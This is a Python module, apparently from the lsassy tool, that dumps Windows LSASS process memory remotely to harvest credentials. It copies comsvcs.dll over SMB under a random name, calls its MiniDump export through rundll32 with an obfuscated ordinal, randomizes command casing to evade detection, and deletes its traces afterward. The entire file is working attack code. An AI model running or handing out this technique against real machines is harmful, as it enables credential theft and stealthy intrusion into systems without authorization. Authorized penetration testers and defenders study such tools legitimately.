import logging
import random
import string

from lsassy.dumpmethod import IDumpMethod, CustomBuffer
from lsassy.impacketfile import ImpacketFile


class DumpMethod(IDumpMethod):

    need_debug_privilege = True

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.comsvcs_copied = False
        self.comsvcs_copy_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
        self.comsvcs_copy_path = "\\Windows\\Temp\\"
        logging.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))

    def random_case(self, s):
        return ''.join(c.upper() if random.getrandbits(1) == 1 else c.lower() for c in s)

    def get_commands(self):
        tasklist = self.random_case("tasklist")
        lsass = self.random_case("lsass")
        copy_command = "copy {}{}.log {}{}".format(self.dump_path, self.dump_name, self.dump_path, self.dump_name)
            
        cmd_command = [
            """for /f "tokens=1,2 delims= " ^%A in ('"{} /fi "Imagename eq {}.ex*" | find "lsass""') do rundll32.exe C:{}{} #+0000^24 ^%B {}{} full""".format(
                tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
            ),
            copy_command
        ]

        pwsh_command = [
            """rundll32.exe C:{}{} `#+0000^24 (Get-Process {}).Id {}{} full""".format(
                 self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name
            ),
            copy_command
        ]

        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }

    def prepare(self, options):
        try:
            logging.info("Opening comsvcs.dll")
            buff = CustomBuffer()
            self._session.smb_session.getFile("C$", "\\Windows\\System32\\comsvcs.dll", buff.write)
            self._session.smb_session.putFile("C$", self.comsvcs_copy_path + self.comsvcs_copy_name, buff.read)
            logging.success("Comsvcs.dll copied")
            self.comsvcs_copied = True
            return True
        except Exception as e:
            print(e)
            return None

    def clean(self):
        if self.comsvcs_copied:
            ImpacketFile.delete(self._session, self.comsvcs_copy_path + self.comsvcs_copy_name, timeout=self._timeout)

        # We should remove the original dump if it wasn't removed by Defender
        self.clean_file(self.dump_path, self.dump_name + ".log")
